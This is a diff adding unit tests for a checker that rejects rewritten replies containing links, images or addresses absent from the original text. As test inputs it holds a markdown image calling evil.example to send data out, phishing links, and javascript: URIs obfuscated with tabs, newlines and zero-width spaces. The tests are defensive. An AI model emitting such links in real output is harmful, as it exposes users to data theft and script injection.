@@ -570,5 +570,46 @@ class WebCodeIsComparedPerMatch(unittest.TestCase):
         self.assertFalse(self.check("If x < y then stop, said Alpha.", "If x is less than y then stop.")["ok"])
 
 
+class LinksAreCheckedToo(unittest.TestCase):
+    """#72 fix round M2: a link, image or address the text did not have is not used; kept links must be web or mail links."""
+
+    def check(self, rep, original, place="notes"):
+        return am.check_reply(reply(rep), original, "rewrite", place)
+
+    def test_new_links_images_and_addresses_are_not_used(self):
+        orig = "Alpha says see the plan."
+        for rep in ("Alpha says see ![x](https://evil.example/c?d=Alpha) the plan.",
+                    "Alpha says [click](https://evil.example/login) the plan.",
+                    "Alpha says [x](java\tscript:alert(1)) the plan.",
+                    "Alpha says [x](java\nscript:alert(1)) the plan.",
+                    "Alpha says [x](jav\u200bascript:alert(1)) the plan.",
+                    "Alpha says see https://evil.example/p the plan.",
+                    "Alpha says mail mailto:a@evil.example the plan.",
+                    "Alpha says [x][1] the plan.\n\n[1]: https://evil.example/r",
+                    "Alpha says [x](#top) [y](/local) the plan.x [z](ftp://evil.example/f)"):
+            r = self.check(rep, orig)
+            self.assertFalse(r["ok"], rep)
+            self.assertTrue("link" in r["message"] or "web code" in r["message"], rep)
+
+    def test_a_javascript_link_is_not_let_through_because_the_text_named_the_word(self):
+        r = self.check("Alpha [x](javascript:alert(1))", "Alpha mentions javascript: as a word")
+        self.assertFalse(r["ok"])
+
+    def test_a_link_the_text_held_is_kept(self):
+        orig = "Alpha, see [the plan](https://example.org/plan) and https://example.org/b now."
+        self.assertTrue(self.check("Alpha: see [the plan](https://example.org/plan) and https://example.org/b soon.", orig)["ok"])
+
+    def test_a_kept_link_must_still_be_a_web_or_mail_link(self):
+        orig = "Alpha, see [x](ftp://example.org/f) now."
+        r = self.check("Alpha: see [x](ftp://example.org/f) soon.", orig)
+        self.assertFalse(r["ok"])
+        orig = "Alpha, see [x](javascript:void(0)) now."
+        self.assertFalse(self.check("Alpha: see [x](javascript:void(0)) soon.", orig)["ok"])
+
+    def test_a_kept_mail_link_is_fine(self):
+        orig = "Alpha, mail [Mia](mailto:mia@example.org) now."
+        self.assertTrue(self.check("Alpha: mail [Mia](mailto:mia@example.org) soon.", orig)["ok"])
+
+
 if __name__ == "__main__":
     unittest.main()
